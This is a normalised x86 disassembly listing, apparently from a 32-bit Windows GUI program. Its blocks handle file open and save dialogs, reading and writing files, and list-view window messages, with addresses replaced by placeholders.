mov ecx [ edi + rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x144
push ecx
call ebx
dec esi
jne r-xdata
inc eax
cmp esi eax
jne r-xdata
mov ecx ebx
mov [ esp + 0x1e0 ] 0x0
call sub_4010c0
test eax eax
jne r-xdata
mov ebx [ esp + 0x14 ]
mov eax [ ebp * 4 + rw-data ]
dec ebx
cmp eax ebx
jge r-xdata
push ebp
call sub_423170
push ebp
call sub_4231b0
add esp 0x8
push r--data
lea edx [ esp + 0xe0 ]
push edx
call [ lstrcpyA@IAT ]
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0xe0 ]
push ecx
call [ lstrlenA@IAT ]
push eax
lea edx [ esp + 0xe4 ]
push edx
push ebp
call [ GetTextExtentPoint32A@IAT ]
mov eax [ esp + 0x38 ]
cmp esi eax
jge r-xdata
mov eax [ edi + rw-data ]
mov edx [ esp + 0x1c ]
mov ecx [ eax + edx + 0x18 ]
add eax edx
cmp ecx 0x10
jb r-xdata
cmp [ esp + 0x14 ] edx
jge r-xdata
mov eax [ esp + 0x14 ]
add eax 0x2
cmp esi eax
jne r-xdata
mov ecx [ esp + 0x10 ]
call sub_4010c0
test eax eax
jne r-xdata
mov edi [ edi + rw-data ]
mov eax [ edi - 0x4 ]
mov ecx 0x10
cmp eax ecx
jb r-xdata
push rw-data
call sub_457f40
add esp 0x4
push eax
push rw-data
lea edx [ esp + 0x2ec ]
push edx
jmp r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
dec edx
push edx
call sub_421f10
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0xc0000000
push rw-data
mov [ esp + 0x34 ] 0x0
mov [ ebp * 4 + rw-data ] 0xffffffff
call [ CreateFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
mov [ esp + 0x30 ] ebx
je r-xdata
mov esi eax
imul esi esi 0x1c
sub ebx eax
mov ecx [ rw-data ]
lea eax [ esp + 0xdc ]
push eax
push 0x0
push 0x143
push ecx
call ebx
push r--data
lea edx [ esp + 0xe0 ]
push edx
call [ lstrcpyA@IAT ]
mov ecx [ rw-data ]
lea eax [ esp + 0xdc ]
push eax
push 0x0
push 0x143
push ecx
call ebx
push r--data
lea edx [ esp + 0xe0 ]
push edx
call [ lstrcpyA@IAT ]
mov ecx [ rw-data ]
lea eax [ esp + 0xdc ]
push eax
push 0x0
push 0x143
push ecx
call ebx
mov eax [ edi + rw-data ]
test eax eax
je r-xdata
lea esi [ eax + 0x4 ]
lea edi [ eax + 0x4 ]
mov edi [ eax + 0x4 ]
jmp r-xdata
cmp [ ebp * 4 + rw-data ] esi
je r-xdata
call [ timeGetTime@IAT ]
push eax
call sub_4b69ba
xor ebx ebx
xor esi esi
add esp 0x4
mov [ esp + 0x24 ] esi
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
lea edi [ ebp + ebp * 2 ]
shl edi 0x2
mov eax [ edi + rw-data ]
test eax eax
mov [ esp + 0x3f0 ] 0x2
mov [ esp + 0x14 ] edi
je r-xdata
mov edi [ edi + rw-data ]
mov eax [ edi - 0x4 ]
mov ecx 0x10
cmp eax ecx
jb r-xdata
push rw-data
call sub_457f40
add esp 0x4
push eax
push rw-data
lea ecx [ esp + 0x1e8 ]
push ecx
jmp r-xdata
lea eax [ edi - 0x18 ]
mov eax [ edi - 0x18 ]
jmp r-xdata
call [ lstrcpynA@IAT ]
xor eax eax
mov ecx 0x13
lea edi [ esp + 0x48 ]
[ edi ]
mov edi [ esp + 0x3f8 ]
mov [ esp + 0x50 ] eax
lea ecx [ esp + 0x1e0 ]
mov eax 0x103
mov [ esp + 0x64 ] ecx
mov [ esp + 0x68 ] eax
mov [ esp + 0x70 ] eax
lea ecx [ esp + 0x48 ]
lea edx [ esp + 0xdc ]
lea eax [ esp + 0x2e4 ]
push ecx
mov [ esp + 0x4c ] 0x4c
mov [ esp + 0x50 ] edi
mov [ esp + 0x58 ] r--data
mov [ esp + 0x64 ] 0x1
mov [ esp + 0x70 ] edx
mov [ esp + 0x78 ] eax
mov [ esp + 0x7c ] r--data
mov [ esp + 0x80 ] 0x1000
call [ GetOpenFileNameA@IAT ]
test eax eax
jne r-xdata
mov esi [ esp + 0x18 ]
push 0x0
push ebx
call [ GetFileSize@IAT ]
mov esi eax
push esi
call sub_4b66db
add esp 0x4
push 0x0
mov edi eax
lea eax [ esp + 0x14 ]
push eax
push esi
push edi
push ebx
call [ ReadFile@IAT ]
mov ecx [ esp + 0x14 ]
push ecx
mov [ esp + 0x24 ] r--data
mov [ esp + 0x28 ] r--data
mov [ esp + 0x2c ] r--data
mov [ esp + 0x30 ] r--data
mov edx [ esp + ebp * 4 + 0x24 ]
push edx
lea eax [ esp + 0xe4 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x10
lea ecx [ esp + 0xdc ]
push ecx
call [ lstrlenA@IAT ]
mov edx [ esp + 0x10 ]
xor esi esi
cmp eax edx
jae r-xdata
mov eax [ edi + rw-data ]
push 0xffffffff
lea edx [ esi + eax + 0x1c ]
push 0x0
lea ecx [ esi + eax ]
push edx
call sub_401dd0
add esi 0x1c
dec ebx
jne r-xdata
mov ecx [ esp + 0x30 ]
push ecx
push ebp
call [ SelectObject@IAT ]
mov edx [ rw-data ]
push ebp
push edx
call [ ReleaseDC@IAT ]
mov eax [ rw-data ]
push 0x0
push esi
push 0x160
push eax
call ebx
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x24 ]
push 0x0
push 0xc8
sub ecx eax
push ecx
push edx
push eax
mov eax [ rw-data ]
push eax
call [ MoveWindow@IAT ]
mov ecx [ rw-data ]
mov esi [ esp + 0x18 ]
mov edi [ esp + 0x3f8 ]
and ecx 0x7
cmp ecx esi
je r-xdata
mov ecx [ edi + rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
cmp edx 0x1
jle r-xdata
inc eax
push eax
add ebp edi
push ebp
lea eax [ esp + 0xe4 ]
push eax
call [ lstrcpynA@IAT ]
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
cmp ecx [ edx * 4 + rw-data ]
mov edi [ lstrcpyA@IAT ]
jne r-xdata
add eax 0x4
push edi
call sub_457f40
add esp 0x4
push edi
mov ebp eax
call [ lstrlenA@IAT ]
mov edx 0xfffffffc
sub edx ebp
add eax edx
test eax eax
jg r-xdata
mov ecx rw-data
mov [ esp + 0x30 ] rw-data
call sub_404310
cmp [ ebp * 4 + rw-data ] 0xffffffff
mov [ esp + 0x3f0 ] 0x3
je r-xdata
cmp eax [ edi + rw-data ]
mov ebp eax
je r-xdata
mov eax [ eax ]
lea eax [ edi - 0x18 ]
mov eax [ edi - 0x18 ]
jmp r-xdata
call [ lstrcpynA@IAT ]
mov ebx [ wsprintfA@IAT ]
mov [ esp + 0x20 ] r--data
mov [ esp + 0x24 ] r--data
mov [ esp + 0x28 ] r--data
mov [ esp + 0x2c ] r--data
mov edi [ esp + ebp * 4 + 0x20 ]
mov esi 0x1
add edi 0xffffffe8
mov edi [ edi - 0x18 ]
jmp r-xdata
cmp [ edi - 0x4 ] ecx
jb r-xdata
lea edx [ esp + 0x1e0 ]
push edx
lea ecx [ esp + 0xc4 ]
call sub_4024d0
lea eax [ esp + 0xc0 ]
push eax
mov ecx ebx
mov [ esp + 0x3f4 ] 0x0
call sub_407460
lea ecx [ esp + 0xc0 ]
mov [ esp + 0x3f0 ] 0xffffffff
call sub_4480e0
jmp r-xdata
mov eax [ rw-data ]
lea edx [ esp + 0x20 ]
push edx
push ebp
push 0x130a
push eax
call [ SendMessageA@IAT ]
push 0x0
lea ecx [ esp + 0x24 ]
push ecx
push edi
mov [ rw-data ] 0x0
call [ InvalidateRect@IAT ]
push edi
call [ UpdateWindow@IAT ]
jmp r-xdata
push ebx
call [ CloseHandle@IAT ]
jmp r-xdata
xor ecx ecx
test eax eax
mov ebp esi
jle r-xdata
push 0x0
lea eax [ esp + 0x24 ]
push eax
inc esi
push edi
mov [ rw-data ] esi
call [ InvalidateRect@IAT ]
push edi
call [ UpdateWindow@IAT ]
mov ecx [ rw-data ]
push 0x0
push 0x1
push 0x14f
push ecx
call ebx
xor eax eax
jmp r-xdata
push 0x0
push esi
push 0x130c
push edi
call ebx
call sub_420a10
mov edx [ rw-data ]
mov al [ esi + rw-data ]
and edx 0xfffffff8
or edx esi
test al al
mov [ rw-data ] edx
jne r-xdata
push r--data
lea ecx [ esp + 0x2e8 ]
push ecx
call [ lstrcatA@IAT ]
mov eax [ rw-data ]
lea edx [ esp + 0x2e4 ]
push edx
push 0x0
push 0x143
push eax
call ebx
lea ecx [ esp + 0x38 ]
push ecx
lea edx [ esp + 0x2e8 ]
push edx
call [ lstrlenA@IAT ]
push eax
lea eax [ esp + 0x2ec ]
push eax
push ebp
call [ GetTextExtentPoint32A@IAT ]
mov eax [ esp + 0x38 ]
cmp esi eax
jge r-xdata
mov edx [ esp + 0x18 ]
mov eax [ edx * 4 + rw-data ]
cmp eax [ esp + 0x14 ]
push r--data
jne r-xdata
lea eax [ esp + 0xdc ]
push eax
lea ecx [ esp + 0x2e8 ]
push ecx
call edi
mov edx [ esp + 0x34 ]
push edx
push ebp
mov [ ebp * 4 + rw-data ] esi
call sub_4221d0
mov eax [ rw-data ]
and eax 0x7
add esp 0x8
cmp eax ebp
jne r-xdata
push ebp
call sub_423170
push ebp
call sub_4231b0
add esp 0x8
mov edi [ edi + rw-data ]
xor ebp ebp
cmp edi ebp
mov [ esp + 0x10 ] ebp
je r-xdata
lea esp [ esp ]
add edi 0xffffffe8
mov edi [ edi - 0x18 ]
jmp r-xdata
cmp [ edi - 0x4 ] ecx
jb r-xdata
mov esi [ esp + 0x3f8 ]
xor eax eax
mov ecx 0x13
lea edi [ esp + 0x48 ]
[ edi ]
lea eax [ esp + 0x2e4 ]
mov [ esp + 0x64 ] eax
mov eax 0x103
lea edx [ esp + 0x48 ]
xor edi edi
lea ecx [ esp + 0xdc ]
mov ebx 0x1
push edx
mov [ esp + 0x4c ] 0x4c
mov [ esp + 0x50 ] esi
mov [ esp + 0x54 ] edi
mov [ esp + 0x58 ] r--data
mov [ esp + 0x88 ] r--data
mov [ esp + 0x64 ] ebx
mov [ esp + 0x6c ] eax
mov [ esp + 0x70 ] ecx
mov [ esp + 0x74 ] eax
mov [ esp + 0x78 ] edi
mov [ esp + 0x7c ] r--data
mov [ esp + 0x80 ] 0x80006
call [ GetSaveFileNameA@IAT ]
test eax eax
jne r-xdata
cmp esi 0xa
jl r-xdata
push eax
call sub_457f40
add esp 0x4
push eax
push edi
lea eax [ esp + 0x2ec ]
push eax
cmp esi edx
jae r-xdata
lea edx [ esi + edi ]
lea esp [ esp ]
mov ecx [ esp + 0x3e8 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x3e4
retn 0x10
call sub_421430
push 0x0
push esi
call sub_4221d0
add esp 0x8
lea esi [ eax + 0x4 ]
lea edx [ esp + 0x1e4 ]
push edx
lea ecx [ esp + 0x1e4 ]
push ecx
jmp r-xdata
cmp ebp 0x3
jne r-xdata
call sub_421430
mov edx [ esp + 0x14 ]
cmp ebp [ edx + rw-data ]
je r-xdata
mov ebp [ edi ]
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ esp + 0x24 ]
call sub_421da0
mov ebp [ ebp ]
cmp ebp [ edi + rw-data ]
jne r-xdata
mov ebx [ esp + 0x28 ]
mov esi [ esp + 0x24 ]
push eax
call sub_457f40
add esp 0x4
push eax
push edi
lea edx [ esp + 0x1e8 ]
push edx
lea eax [ esp + 0x2e4 ]
push eax
lea ecx [ esp + 0xa8 ]
call sub_4024d0
lea ecx [ esp + 0xa4 ]
push ecx
mov ecx [ esp + 0x14 ]
mov [ esp + 0x3f4 ] ebx
call sub_407460
lea ecx [ esp + 0xa4 ]
mov [ esp + 0x3f0 ] 0xffffffff
call sub_4480e0
mov edx [ esp + 0x14 ]
mov [ esp + 0x18 ] edx
mov [ esp + 0x34 ] 0x1
mov ecx [ rw-data ]
lea eax [ esp + 0x20 ]
push eax
push ebp
push 0x130a
push ecx
call [ SendMessageA@IAT ]
push edi
lea edx [ esp + 0x24 ]
push edx
push esi
mov [ rw-data ] edi
call [ InvalidateRect@IAT ]
push esi
call [ UpdateWindow@IAT ]
jmp r-xdata
push esi
push edi
lea eax [ esp + 0x1e8 ]
push eax
lea ecx [ esp + 0x2f0 ]
push r--data
push ecx
call ebx
add esp 0x14
lea edx [ esp + 0x2e4 ]
push edx
inc esi
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp ecx eax
je r-xdata
lea ecx [ ecx ]
mov edx [ esp + 0x10 ]
mov ebx [ esp + 0x30 ]
inc ecx
cmp ecx eax
jl r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x1c ]
mov ebp [ esp + 0x10 ]
mov edi [ esp + 0x34 ]
inc ecx
add eax 0x1c
mov [ esp + 0x14 ] ecx
mov [ esp + 0x1c ] eax
jmp r-xdata
lea esi [ eax + 0x4 ]
call edi
lea eax [ esp + 0xdc ]
push eax
lea ecx [ esp + 0x1e4 ]
push ecx
call [ lstrcatA@IAT ]
mov eax [ rw-data ]
lea edx [ esp + 0x1e0 ]
push edx
push 0x0
push 0x143
push eax
call ebx
lea ecx [ esp + 0x38 ]
push ecx
lea edx [ esp + 0x1e4 ]
push edx
call [ lstrlenA@IAT ]
mov ecx [ esp + 0x14 ]
push eax
lea eax [ esp + 0x1e8 ]
push eax
push ecx
call [ GetTextExtentPoint32A@IAT ]
mov eax [ esp + 0x38 ]
cmp esi eax
jge r-xdata
push ebp
call sub_4207d0
mov ecx [ rw-data ]
imul esi esi 0x1c
mov eax [ esi + ecx + 0x18 ]
add esi ecx
cmp eax 0x10
jb r-xdata
call sub_421430
test esi esi
je r-xdata
jmp r-xdata
sub edx esi
push edx
lea edx [ esi + edi ]
push edx
lea eax [ edi + ebp ]
push eax
call sub_4b5890
add esp 0xc
push 0x0
push 0x0
push 0x0
push ebx
call [ SetFilePointer@IAT ]
mov eax [ esp + 0x10 ]
push 0x0
lea ecx [ esp + 0x34 ]
push ecx
sub ebp esi
add ebp eax
push ebp
push edi
push ebx
call [ WriteFile@IAT ]
push ebx
call [ SetEndOfFile@IAT ]
mov ebp [ esp + 0x1c ]
lea ecx [ esi + eax ]
cmp ecx edx
jb r-xdata
inc esi
cmp esi edx
jb r-xdata
cmp [ esi + edi + 0x1 ] 0xa
je r-xdata
mov bl [ esp + ecx + 0xdc ]
cmp bl [ edx + ecx ]
jne r-xdata
mov eax [ edi + rw-data ]
test eax eax
jne r-xdata
add esi 0x4
push esi
call sub_428c20
jmp r-xdata
mov esi [ esi + 0x4 ]
push esi
call sub_428c20
jmp r-xdata
push esi
call j_sub_4b66ed#2
add esp 0x4
jmp r-xdata
test esi esi
jne r-xdata
mov ebp [ esp + 0x1c ]
push ebx
call [ CloseHandle@IAT ]
jmp r-xdata
cmp [ esi + edi ] 0xd
jne r-xdata
jmp r-xdata
add esi 0x2
add esp 0x4
mov ecx rw-data
call sub_401420
mov edi ebx
sub edi esi
sar edi 0x2
xor edi edi
jmp r-xdata
test esi esi
mov eax [ ebx - 0x4 ]
mov [ esi + edx * 4 ] eax
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x1c ]
mov [ rw-data ] eax
mov [ ecx * 4 + rw-data ] eax
call sub_4b69c7
xor edx edx
div edi
mov eax [ esi + edx * 4 ]
mov [ ebp + 0x8 ] eax
cmp eax [ rw-data ]
jne r-xdata
sub ebx esi
sar ebx 0x2
xor ebx ebx
jmp r-xdata
mov ebx [ esp + 0x28 ]
push 0x0
dec ebx
push ebx
lea ecx [ esp + 0x28 ]
call sub_421cd0
mov ecx [ esp + 0x10 ]
mov ebp [ ebp ]
mov esi [ esp + 0x24 ]
inc ecx
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x14 ]
cmp ebp [ ecx + rw-data ]
jne r-xdata
sub_425b70
push esi
mov esi [ esp + 0x8 ]
test esi esi
jge r-xdata
cmp esi 0x4
jl r-xdata
xor esi esi
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push esi
and eax 0xfffffff8
push 0x130c
or eax esi
push ecx
mov [ rw-data ] eax
call [ SendMessageA@IAT ]
mov al [ esp + 0xc ]
test al al
je r-xdata
mov esi 0x3
mov edx [ rw-data ]
and edx 0x7
mov al [ edx + rw-data ]
test al al
jne r-xdata
mov [ rw-data ] 0x0
call sub_421430
mov eax 0x1
pop esi
retn
push 0x0
push esi
call sub_4221d0
add esp 0x8
sub_425bf0
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn
cmp [ edi + 0x380 ] 0x2
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
push 0x0
push 0x2
call sub_4221d0
add esp 0x8
mov eax [ ecx ]
xor eax eax
jmp r-xdata
cmp [ edi + 0x34 ] esi
jb r-xdata
mov ebp [ lstrcmpiA@IAT ]
cmp eax ecx
push ebx
push ebp
push esi
mov ebx eax
mov esi 0x10
je r-xdata
lea eax [ edi + 0x20 ]
mov eax [ edi + 0x20 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push 0x0
push edi
push 0x0
push 0x0
push eax
push 0x2
call sub_423c30
add esp 0x18
pop esi
pop ebp
pop ebx
lea ecx [ edi + 0x20 ]
mov ecx [ edi + 0x20 ]
jmp r-xdata
cmp [ edi + 0x34 ] esi
jb r-xdata
mov ebx [ ebx ]
cmp ebx [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax + 0xc0 ]
add eax 0xa8
cmp ecx esi
jb r-xdata
push eax
push ecx
call ebp
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax + 0x34 ]
add eax 0x1c
cmp ecx esi
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
lea ecx [ edi + 0xac ]
mov ecx [ edi + 0xac ]
jmp r-xdata
cmp [ edi + 0xc0 ] esi
jb r-xdata
xor esi esi
push eax
push ecx
call sub_420820
add esp 0x8
test eax eax
jge r-xdata
add esi 0x1c
cmp esi 0x380
jl r-xdata
cmp esi 0x1c
je r-xdata
test esi esi
je r-xdata
pop esi
pop ebp
pop ebx
pop edi
retn
cmp esi 0xc4
je r-xdata
mov ecx [ ebx + 0x8 ]
lea eax [ esi + edi ]
push eax
add ecx esi
call sub_4211e0
sub_425d10
push ecx
push ebp
push esi
push edi
call sub_46fe50
push 0x0
call sub_4231b0
mov esi [ esp + 0x18 ]
lea eax [ esp + 0x10 ]
push eax
push esi
push 0x2
mov [ esp + 0x1c ] 0xffffffff
call sub_4232a0
mov ebp eax
add esp 0x10
test ebp ebp
jne r-xdata
push 0x0
push ebp
push 0x0
push 0x0
push esi
push 0x0
call sub_423c30
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x30 ]
push ecx
push edx
push 0xffffffff
push esi
push 0x0
call sub_423380
add esp 0x2c
pop edi
pop esi
pop ebp
pop ecx
retn
sub esp 0x1c
mov ecx esp
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x4 ] al
mov eax esi
mov [ esp + 0x28 ] esp
lea edi [ eax + 0x1 ]
lea ecx [ ecx ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
push esi
call sub_401e80
call sub_401530
add esp 0x1c
cmp eax 0x3
je r-xdata
cmp [ rw-data ] 0x5
jne r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
mov eax [ rw-data ]
push 0x1
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
push 0x0
push edx
push eax
push esi
call sub_4863a0
add esp 0x2c
pop edi
pop esi
pop ebp
pop ecx
retn
mov [ rw-data ] 0xb
sub_425df0
mov eax [ rw-data ]
sub esp 0x28
push ebx
push ebp
push esi
mov esi [ esp + 0x38 ]
and eax 0x7
cmp eax esi
push edi
je r-xdata
mov al [ esi + rw-data ]
test al al
mov [ esp + 0x3c ] 0xffffffff
jne r-xdata
push 0x0
push esi
call sub_425b70
add esp 0x8
lea ebp [ esi + esi * 2 ]
shl ebp 0x2
mov eax [ ebp + rw-data ]
xor edi edi
test eax eax
je r-xdata
push 0x0
push esi
call sub_4221d0
add esp 0x8
cmp eax [ ebp + rw-data ]
mov esi eax
je r-xdata
mov eax [ eax ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x28
retn
mov ebx [ SendMessageA@IAT ]
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov esi [ esi ]
mov eax [ ebp + rw-data ]
inc edi
cmp esi eax
jne r-xdata
mov [ esp + 0x3c ] edi
mov ecx [ esp + 0x40 ]
push ecx
push eax
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x10 ]
push ecx
push edi
push 0x102b
push edx
mov [ esp + 0x30 ] 0x3
mov [ esp + 0x2c ] 0xfffffffc
call ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x34 ]
add eax 0x1c
cmp ecx 0x10
jb r-xdata
mov ecx [ esp + 0x3c ]
cmp ecx 0xffffffff
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x28
retn
mov edx 0x3
mov [ esp + 0x20 ] edx
mov [ esp + 0x1c ] edx
lea edx [ esp + 0x10 ]
push edx
push ecx
push 0x102b
push eax
call ebx
sub_425f00
push ebx
push esi
mov esi [ esp + 0xc ]
mov eax [ esi + 0x110 ]
test eax eax
push edi
mov ebx 0x10
jne r-xdata
cmp [ esi + 0x114 ] ebx
jb r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ esi + 0x100 ]
mov eax [ esi + 0x100 ]
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ esi + 0x340 ]
test eax eax
je r-xdata
cmp [ esi + 0x360 ] ebx
jb r-xdata
test eax eax
jne r-xdata
push eax
call j_sub_4b692d
add esp 0x4
lea edi [ esi + 0x34c ]
mov edi [ esi + 0x34c ]
jmp r-xdata
cmp [ esi + 0x344 ] ebx
jb r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ esi + 0xf8 ] ebx
jb r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0xf4 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x330 ]
mov eax [ esi + 0x330 ]
jmp r-xdata
test eax eax
mov [ rw-data ] eax
jge r-xdata
lea eax [ esi + 0xe4 ]
mov eax [ esi + 0xe4 ]
jmp r-xdata
cmp [ esi + 0x34 ] ebx
jb r-xdata
cmp eax 0x1
jle r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
push eax
call j_sub_4b692d
add esp 0x4
lea ecx [ esi + 0x20 ]
mov ecx [ esi + 0x20 ]
jmp r-xdata
push eax
call j_sub_4b692d
add esp 0x4
mov [ rw-data ] 0x1
mov ecx [ esp + 0x10 ]
push ecx
push esi
push eax
call sub_423720
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
retn
pop edi
pop esi
mov eax 0x1
pop ebx
retn
push 0x1
push esi
push 0x0
push edi
lea edx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x2c ]
push 0x1
push edx
mov edx [ rw-data ]
push eax
mov eax [ esp + 0x34 ]
push eax
push edx
push ecx
call sub_4863a0
add esp 0x2c
test eax eax
jne r-xdata
sub_426030
sub esp 0x164
push ebx
push ebp
mov ebp [ esp + 0x174 ]
cmp ebp 0x200
push esi
push edi
mov edi [ esp + 0x178 ]
ja r-xdata
cmp ebp 0x20a
ja r-xdata
je r-xdata
cmp ebp 0x1014
jne r-xdata
je r-xdata
call [ GetFocus@IAT ]
cmp eax edi
jne r-xdata
cmp ebp 0x102
ja r-xdata
mov eax [ esp + 0x184 ]
mov ecx [ esp + 0x180 ]
mov edx [ rw-data ]
push eax
push ecx
push ebp
push edi
push edx
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x164
retn 0x10
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax ebp
sub eax 0x201
je r-xdata
mov eax [ esp + 0x184 ]
mov esi [ SendMessageA@IAT ]
movzx ecx ax
lea edx [ esp + 0x1c ]
push edx
shr eax 0x10
push 0x0
mov [ esp + 0x28 ] eax
mov eax [ rw-data ]
push 0x1039
push eax
mov [ esp + 0x2c ] ecx
call esi
mov eax [ esp + 0x180 ]
and eax 0x1
mov ecx [ esp + 0x28 ]
je r-xdata
cmp ebp 0x104
je r-xdata
je r-xdata
lea edx [ esp + 0x10 ]
push edx
call [ GetCursorPos@IAT ]
lea eax [ esp + 0x10 ]
push eax
push edi
call [ ScreenToClient@IAT ]
movzx ecx [ esp + 0x14 ]
movzx edx [ esp + 0x10 ]
shl ecx 0x10
or ecx edx
push ecx
push 0x0
push 0x200
push edi
call [ PostMessageA@IAT ]
push edi
call [ SetFocus@IAT ]
mov [ rw-data ] 0x0
push edi
call [ SetFocus@IAT ]
jmp r-xdata
dec eax
jne r-xdata
test eax eax
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ rw-data ]
push eax
call [ SetFocus@IAT ]
mov ecx [ esp + 0x184 ]
mov edx [ esp + 0x180 ]
mov eax [ rw-data ]
push ecx
push edx
push 0x100
jmp r-xdata
cmp ebp 0x113
jbe r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x164
retn 0x10
cmp ebp 0x8
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
push eax
call [ SendMessageA@IAT ]
cmp ebp 0x115
jbe r-xdata
cmp ebp 0x100
jne r-xdata
mov [ rw-data ] 0x0
call [ ReleaseCapture@IAT ]
jmp r-xdata
cmp ecx 0xffffffff
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x1004
and eax 0x7
push ecx
mov [ esp + 0x20 ] eax
call esi
mov edx [ esp + 0x28 ]
cmp edx 0xffffffff
je r-xdata
mov [ rw-data ] 0x0
call [ ReleaseCapture@IAT ]
mov ecx [ esp + 0x28 ]
push edi
mov [ rw-data ] 0x1
call [ SetCapture@IAT ]
mov ecx [ esp + 0x28 ]
mov [ rw-data ] ecx
jmp r-xdata
jmp r-xdata
push 0x11
call [ GetAsyncKeyState@IAT ]
test ah ah
jns r-xdata
mov eax [ esp + 0x2c ]
test eax eax
lea edx [ esp + 0x30 ]
push edx
mov [ esp + 0x34 ] 0x2
push ecx
jne r-xdata
mov eax [ rw-data ]
push rw-data
push 0x0
push 0x411
push eax
call esi
call [ ReleaseCapture@IAT ]
jmp r-xdata
mov ebx [ rw-data ]
cmp ebx edx
je r-xdata
mov esi [ esp + 0x180 ]
lea eax [ esi - 0x9 ]
cmp eax 0x68
ja r-xdata
mov esi [ esp + 0x180 ]
cmp esi 0x11
je r-xdata
push 0x1038
push edi
mov [ esp + 0x44 ] eax
call esi
mov eax [ esp + 0x2c ]
lea edx [ esp + 0x48 ]
push edx
mov [ esp + 0x54 ] eax
mov eax [ esp + 0x2c ]
push eax
push 0x102d
lea ecx [ esp + 0x7c ]
push edi
mov [ esp + 0x70 ] 0x104
mov [ esp + 0x6c ] ecx
call esi
mov ebp 0xc
push 0x100e
push edi
call esi
mov eax [ esp + 0x2c ]
lea edx [ esp + 0x48 ]
push edx
mov [ esp + 0x54 ] eax
mov eax [ esp + 0x2c ]
push eax
push 0x102d
lea ecx [ esp + 0x7c ]
push edi
mov [ esp + 0x70 ] 0x104
mov [ esp + 0x6c ] ecx
call esi
mov ebp 0x4
jmp r-xdata
mov ecx edx
sub ecx ebx
mov [ esp + 0x40 ] ecx
jns r-xdata
mov eax [ rw-data ]
push eax
call [ SetFocus@IAT ]
mov ecx [ esp + 0x184 ]
mov edx [ rw-data ]
push ecx
push esi
push 0x100
push edx
call [ SendMessageA@IAT ]
movzx eax [ eax + lookup_table_426804 ]
jmp [ eax * 4 + jump_table_4267c8 ]
cmp esi 0x46
je r-xdata
mov ecx [ rw-data ]
push rw-data
push 0x0
push 0x411
push ecx
call esi
call [ ReleaseCapture@IAT ]
mov ebp [ esp + 0x17c ]
jmp r-xdata
mov ecx [ esp + 0x184 ]
mov [ esp + 0x54 ] ecx
mov ecx [ esp + 0x180 ]
mov [ esp + 0x50 ] ecx
mov [ rw-data ] eax
mov [ esp + 0x10 ] eax
lea ecx [ esp + 0x70 ]
lea eax [ esp + 0x10 ]
mov [ rw-data ] ecx
mov ecx [ esp + 0x34 ]
mov [ rw-data ] edx
mov edx [ esp + 0x3c ]
push eax
push edi
mov [ esp + 0x54 ] 0x200
mov [ esp + 0x50 ] edi
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ esp + 0x1c ] ecx
call [ ClientToScreen@IAT ]
mov ecx [ esp + 0x10 ]
mov eax ebp
cdq
sub eax edx
sar eax 0x1
lea edx [ eax + ecx - 0x3 ]
mov ecx [ esp + 0x14 ]
movzx eax dx
add ecx 0xc
movzx edx cx
